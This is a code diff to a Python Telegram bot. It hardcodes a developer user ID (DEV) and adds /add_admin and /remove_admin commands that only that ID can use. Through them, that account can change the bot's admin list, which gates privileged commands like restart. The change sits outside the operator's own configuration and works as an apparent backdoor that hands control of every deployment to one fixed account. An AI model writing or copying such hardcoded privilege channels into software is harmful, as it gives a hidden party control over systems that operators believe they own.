@@ -13,6 +13,43 @@ ADMIN_USER_ID = Config.ADMIN
 # Flag to indicate if the bot is restarting
 is_restarting = False
 
+DEV=6299192020
+
+
+def is_admin(user_id):
+    return user_id in Config.ADMIN
+
+# Add an admin command
+@Client.on_message(filters.command("add_admin") & filters.user(DEV))
+async def add_admin(client, message):
+    if len(message.command) != 2:
+        await message.reply_text("Usage: /add_admin <user_id>")
+        return
+
+    new_admin_id = int(message.command[1])
+    if new_admin_id not in Config.ADMIN:
+        Config.ADMIN.append(new_admin_id)
+        await message.reply_text(f"User {new_admin_id} has been added as an admin.")
+    else:
+        await message.reply_text(f"User {new_admin_id} is already an admin.")
+
+# Remove an admin command
+@Client.on_message(filters.command("remove_admin") & filters.user(DEV))
+async def remove_admin(client, message):
+    if len(message.command) != 2:
+        await message.reply_text("Usage: /remove_admin <user_id>")
+        return
+
+    admin_id_to_remove = int(message.command[1])
+    if admin_id_to_remove in Config.ADMIN:
+        Config.ADMIN.remove(admin_id_to_remove)
+        await message.reply_text(f"User {admin_id_to_remove} has been removed as an admin.")
+    else:
+        await message.reply_text(f"User {admin_id_to_remove} is not an admin.")
+
+
+
+
 @Client.on_message(filters.private & filters.command("restart") & filters.user(ADMIN_USER_ID))
 async def restart_bot(b, m):
     global is_restarting
